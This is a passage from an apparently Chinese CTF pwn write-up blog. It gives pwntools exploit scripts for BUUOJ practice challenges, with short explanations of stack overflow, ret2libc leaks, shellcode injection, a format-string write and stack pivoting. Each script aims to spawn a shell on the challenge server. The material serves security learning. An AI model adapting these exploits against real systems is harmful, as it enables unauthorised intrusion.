class="string">&quot;debug&quot;</span></span><br><span class="line">elf = context.binary</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">29317</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">Payload = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;aaaaaa&#x27;</span> + <span class="string">b&#x27;\xff&#x27;</span></span><br><span class="line">io.sendline(Payload)</span><br><span class="line">io.recv()</span><br><span class="line">leak = flat(cyclic(<span class="number">0xE7</span> + <span class="number">4</span>), elf.plt[<span class="string">&#x27;write&#x27;</span>], <span class="number">0x8048825</span>, <span class="number">1</span>, elf.got[<span class="string">&#x27;write&#x27;</span>], <span class="number">4</span>)</span><br><span class="line">io.sendline(leak)</span><br><span class="line">libc.address = u32(io.recv(<span class="number">4</span>)) - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc -&gt; &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(libc.address))</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">io.sendline(Payload)</span><br><span class="line">rop = flat(cyclic(<span class="number">0xE7</span> + <span class="number">4</span>), libc.sym[<span class="string">&#x27;system&#x27;</span>], <span class="string">&#x27;aaaa&#x27;</span>, <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>)))</span><br><span class="line">io.sendline(rop)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a>ciscn_2019_n_5</h3><p>name[100]写入shellcode</p><p>text[30]跳转到bss段上的shellcode执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a1: char text[30]; // [rsp+0h] [rbp-20h] BYREF</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25673</span>)</span><br><span class="line"></span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;tell me your name\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">leak = cyclic(<span class="number">0x20</span>)+<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>+p64(<span class="number">0x00601080</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;What do you want to say to me?\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(leak)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="ciscn-2019-en-2"><a href="#ciscn-2019-en-2" class="headerlink" title="ciscn_2019_en_2"></a>ciscn_2019_en_2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding=UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.update(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">27205</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_en_2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x400c83</span></span><br><span class="line">main_addr = <span class="number">0x400B28</span></span><br><span class="line">ret = <span class="number">0x4006b9</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Input your choice!\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里建议payload用b&quot;\0&quot;截断，不然gets会持续读取内存直到遇到 null 字符为止到，切片的时候会难切一点，当然如果乐意不截断当我没说</span></span><br><span class="line"><span class="comment"># 初学者可能会这样想，这个程序没有PIE，相当于地址是固定的，那我不是可以直接IDA找到函数libc地址查表然后直接写嘛。当然不是，在没有运行之前，plt表jmp的地址是0x0000没有的，运行后才会有地址，这时才能判断对应libc版本</span></span><br><span class="line"><span class="comment"># payload这样写是因为我们还没有执行过puts函数，其中got表是用来修改plt表使之jmp到正确的puts函数的地址，否则直接写plt还是要jmp回去一遍修改plt下的代码使指针指向正确的plt表，这样写的目的也就是最快且直接调用目标函数的方法</span></span><br><span class="line">payload = <span class="string">b&quot;\x00&quot;</span> + <span class="string">b&quot;a&quot;</span> * (<span class="number">0x50</span> + <span class="number">7</span>) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Input your Plaintext to be encrypted\n&#x27;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#  用来接收Ciphertext和\n</span></span><br><span class="line"><span class="comment">#  puts(&quot;Ciphertext&quot;);</span></span><br><span class="line"><span class="comment">#  return puts(s);</span></span><br><span class="line">sh.recvline()</span><br><span class="line">sh.recvline()</span><br><span class="line"></span><br><span class="line">puts_addr = u64(sh.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(puts_addr)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">offset = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">binsh = offset + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">system = offset + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;choice!\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\0&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x57</span>)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(system)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;encrypted\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h3><p>这个地方要注意elf.sym[“exit”]不能用0xdeadbeef替代，退出地址只能是exit，0xdeadbeef并没有指向exit函数的代码</p><blockquote><p><a href="https://www.cnblogs.com/jy030515/articles/16418810.html">https://www.cnblogs.com/jy030515/articles/16418810.html</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.update(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;not_the_same_3dsctf_2016&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">27132</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x2D</span> + p32(<span class="number">0x080489A0</span>) + p32(elf.sym[<span class="string">&#x27;printf&#x27;</span>]) + p32(elf.sym[<span class="string">&quot;exit&quot;</span>]) + p32(<span class="number">0x080ECA2D</span>)<span class="comment">#padding+get_secret()+printf+exit+bss:fl4g</span></span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ciscn-2019-ne-5"><a href="#ciscn-2019-ne-5" class="headerlink" title="ciscn_2019_ne_5"></a>ciscn_2019_ne_5</h3><p>由 <strong>case 1</strong> 和 <strong>case 4</strong> 可知，由于 dest 先对于 ebp 的 offset 为 0x48 ，而 src 的偏移为 0xFC ，所以为如果在 <strong>case 1</strong> 中往 <strong>src</strong> 写入足够长的字符串，再通过 case 4 将 <strong>src</strong> 复制到 <strong>dest</strong> 中就还可以进行栈溢出。</p><p>只需要覆盖 dest 的 0x48 字节以及 pre-ebp 的 0x4 字节，再填写需要执行的 system(‘sh’) 就可以拿到shell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">28697</span>)</span><br><span class="line"></span><br><span class="line">system = <span class="number">0x080484D0</span></span><br><span class="line">sh = <span class="number">0x080482ea</span>  <span class="comment"># --string &quot;sh&quot;</span></span><br><span class="line">main = <span class="number">0x08048722</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x4c</span> + p32(system) + p32(<span class="number">0xdeadbeef</span>) + p32(sh) <span class="comment">#&quot;system&quot;函数调用&quot;/bin/sh&quot;要加占位符作为返回地址，32位就是4个字节b&quot;a&quot;*4，这里用的是万能的p32()转成4个字节，p32()里随便写8个16进制数就可以</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;password:&#x27;</span>,<span class="string">b&#x27;administrator&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Exit\n:&#x27;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;info:&#x27;</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Exit\n:&#x27;</span>,<span class="string">b&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="铁人三项-第五赛区-2018-rop"><a href="#铁人三项-第五赛区-2018-rop" class="headerlink" title="铁人三项(第五赛区)_2018_rop"></a>铁人三项(第五赛区)_2018_rop</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25107</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./2018_rop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">leak = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x88</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span> + p32(write_plt) + p32(main) + p32(<span class="number">0x1</span>) + p32(write_got) + p32(</span><br><span class="line">    <span class="number">0x4</span>)  <span class="comment"># write: 参数1是模式，“1”为写模式，参数2在栈上其实是一个地址，它会将这个地址上存的字符串给打印出来，参数3是打印字符串的长度</span></span><br><span class="line">sh.sendline(leak)</span><br><span class="line">write_addr = u32(sh.recv(<span class="number">4</span>))  <span class="comment"># 接收write地址</span></span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write_addr)  <span class="comment"># libc6-i386_2.27-3ubuntu1_amd64</span></span><br><span class="line">offset = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = libc.dump(<span class="string">&#x27;system&#x27;</span>) + offset</span><br><span class="line">bin_sh = libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>) + offset</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(system_addr) + p32(<span class="number">0x0</span>) + p32(bin_sh)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">26755</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./bjdctf_2020_babyrop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x00000000004006AD</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400733</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在64位程序中，函数的前六个参数是通过寄存器来传递的，而不是通过堆栈。其中，第一个参数是通过rdi寄存器来传递的。所以在构造payload时，我们需要先将puts_got放入rdi寄存器</span></span><br><span class="line"><span class="comment"># 这就需要用到pop_rdi这个gadget。然后再返回到puts_plt，执行puts函数。</span></span><br><span class="line"><span class="comment"># 所以，64位程序的payload是 padding + p64(pop_rdi) + p64(put_got) + p64(put_plt) + p64(main_addr)</span></span><br><span class="line"><span class="comment"># 32位程序的payload是 padding + p32(puts_plt) + p32(main_addr) + p32(puts_got)</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x20</span> + <span class="number">0x8</span>) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;Pull up your sword and tell me u story!\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(puts_addr)</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>, puts_addr)</span><br><span class="line"></span><br><span class="line">offset = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">bin_sh = libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>) + offset</span><br><span class="line">system_addr = libc.dump(<span class="string">&#x27;system&#x27;</span>) + offset</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x20</span> + <span class="number">0x8</span>) + p64(pop_rdi) + p64(bin_sh) + p64(system_addr) + p64(<span class="number">0x0</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>总结（以put函数为例）：</p><p>64位程序的payload是 padding + p64(pop_rdi) + p64(put_got) + p64(put_plt) + p64(main_addr)</p><p>32位程序的payload是 padding + p32(puts_plt) + p32(main_addr) + p32(puts_got)</p><h3 id="bjdctf-2020-babystack2"><a href="#bjdctf-2020-babystack2" class="headerlink" title="bjdctf_2020_babystack2"></a>bjdctf_2020_babystack2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">26865</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x0000000000400726</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;Please input the length of your name:\n&#x27;</span>, <span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x10</span> + <span class="string">b&#x27;A&#x27;</span> * <span class="number">8</span> + p64(backdoor)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">b&quot;What&#x27;s u name?\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="jarvisoj-fm"><a href="#jarvisoj-fm" class="headerlink" title="jarvisoj_fm"></a>jarvisoj_fm</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">STACK CANARY</span><br><span class="line">Canary found</span><br></pre></td></tr></table></figure><p>格式化字符串</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwn@pwn:~/Desktop/PWN/PWN$ ./fm</span><br><span class="line">aaaa %p %p %p %p %p %p %p %p %p %p %p</span><br><span class="line">aaaa 0xffa2596c 0x50 0x1 (nil) 0x1 0xf7f98a30 0xffa25a84 0xffffffff 0xf7f646b8 0x25 0x61616161</span><br></pre></td></tr></table></figure><p>栈偏移为11个单位</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">25562</span>)</span><br><span class="line"></span><br><span class="line">x_addr = <span class="number">0x0804A02C</span></span><br><span class="line">payload = p32(x_addr) + <span class="string">b&quot;%11$n&quot;</span><span class="comment">#$n表示将到目前为止已经打印的字符数写入参数指向的内存位置</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h3><p>栈迁移</p><p>这里借用printf函数的一个特性：printf会根据%s遍历输出字符串, 直到遇到\0为止。由于payload1中没有\0结尾, 所以printf会一直读取s缓冲区之后的栈数据, 作为字符串输出。导致printf不仅输出了s缓冲区的内容, 还输出ebp的地址和栈上的其他数据</p><p>payload2 <code>0x38</code> &#x3D; s[40] (40字节)  + pre-ebp (4字节) + 函数返回地址(4字节) + payload2长度(4+4+4+4字节) + 栈对齐padding(2字节)</p><p>具体原理：</p><ul><li><strong>填充 <code>A</code> * 4</strong>：<ul><li>这四个字节用来覆盖原先存储的 <code>ebp</code> (基址指针)。</li></ul></li><li><strong>system_addr</strong>：<ul><li><code>system</code> 函数的地址（来自<code>elf.symbols[&quot;system&quot;]</code> ）。它的作用是执行一个系统命令。</li></ul></li><li><strong>p32(0)</strong> ：<ul><li><code>system</code>函数会将栈顶值作为参数。这里填充0 ，目的是让 <code>system</code> 不接收任何额外参数。</li></ul></li><li><strong>ebp_addr - 0x38 + 0x10 + b”&#x2F;bin&#x2F;sh”</strong> ：<ul><li>这里的计算是为了确定将字符串 “&#x2F;bin&#x2F;sh” 存储在栈上的正确位置。当 <code>system</code> 被调用时，它会寻找栈上的字符串作为要执行的命令。”&#x2F;bin&#x2F;sh” 是标准的 shell 命令。</li></ul></li><li>**payload.ljust(0x28, b’\x00’)**：<ul><li>用空字符（’\x00’）填充<code>payload</code>直至达到0x28字节，这部分对控制流劫持不重要。</li></ul></li><li>**p32(ebp_addr - 0x38)**：<ul><li>用先前泄露的ebp减掉0x38，计算出一个栈地址。这个地址将会覆盖函数的返回地址，用于后续劫持控制流。</li></ul></li><li>**p32(leave_ret_addr)**：<ul><li><code>leave_ret_addr</code> 是<code>leave</code>指令的地址。 <code>leave</code>指令常用于函数返回前的栈清理，等效于 <code>mov esp, ebp; pop ebp;</code>。结合 <code>ret</code> 指令，这步将控制流跳转到 <code>leave</code> 指令。</li></ul></li></ul><p>栈情况如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[填充数据] </span><br><span class="line">[system函数地址]</span><br><span class="line">[0]  // system函数的假参数</span><br><span class="line">[&quot;/bin/sh&quot;字符串的地址] </span><br><span class="line">[...] // 不重要</span><br><span class="line">[新的返回地址，指向leave指令]</span><br></pre></td></tr></table></figure><ul><li><strong>劫持执行：</strong>当<code>vul</code>函数准备返回时，由于<code>payload</code>中修改过的返回地址，程序流程会跳转到<code>leave</code>指令。</li><li><strong><code>leave</code>的妙用：</strong><code>leave</code> 指令（ <code>mov esp, ebp; pop ebp;</code>) 执行后，<code>esp</code> (栈指针) 刚好指向 <code>system</code> 函数的地址。</li><li><strong><code>ret</code>的触发：</strong>紧随 <code>leave</code> 之后的 <code>ret</code> 指令会 <code>pop</code> 当前 <code>esp</code> 的值，并跳转到该值所指向的地址。因此，执行相当于 <code>ret system();</code>，直接调用了 <code>system</code> 函数。</li><li><strong>命令执行：</strong> 因为栈布局的设置，<code>system</code> 函数接收到了栈上的 “&#x2F;bin&#x2F;sh” 字符串作为参数， 从而执行了shell命令，为攻击者提供交互式控制。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">27199</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_es_2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&quot;a&quot;</span> * <span class="number">0x24</span> + <span class="string">b&quot;b&quot;</span> * <span class="number">0x4</span></span><br><span class="line">sh.recvuntil(<span class="string">b&quot;Welcome, my friend. What&#x27;s your name?\n&quot;</span>)</span><br><span class="line">sh.send(payload1)</span><br><span class="line">sh.recvuntil(<span class="string">b&quot;bbbb&quot;</span>)  <span class="comment"># 这4字节只起一个定位的作用，因为后面跟着ebp地址</span></span><br><span class="line">ebp_addr = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">leave_ret_addr = <span class="number">0x080485FD</span></span><br><span class="line">system_addr = elf.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span> + p32(system_addr) + p32(<span class="number">0</span>) + p32(ebp_addr - <span class="number">0x38</span> + <span class="number">0x10</span>) + <span class="string">b&quot;/bin/sh&quot;</span>  <span class="comment"># 0x38可替代为40+4+4+16+2</span></span><br><span class="line">payload2 = payload2.ljust(<span class="number">0x28</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p32(ebp_addr - <span class="number">0x38</span>) + p32(leave_ret_addr)</span><br><span class="line">sh.send(payload2)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="jarvisoj-tell-me-something"><a href="#jarvisoj-tell-me-something" class="headerlink" title="jarvisoj_tell_me_something"></a>jarvisoj_tell_me_something</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> 